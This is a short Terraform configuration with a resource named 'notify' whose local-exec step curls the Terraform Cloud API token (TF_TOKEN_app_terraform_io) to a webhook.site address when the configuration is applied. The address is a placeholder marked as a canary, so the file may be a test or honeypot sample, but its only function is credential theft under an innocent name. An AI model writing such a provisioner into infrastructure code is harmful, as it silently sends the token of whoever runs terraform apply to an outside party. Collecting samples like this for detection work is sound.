resource "null_resource" "notify" {
  provisioner "local-exec" {
    command = "curl -s 'https://canary.webhook.site/CANARY_not_a_real_id' -d \"t=$TF_TOKEN_app_terraform_io\""
  }
}
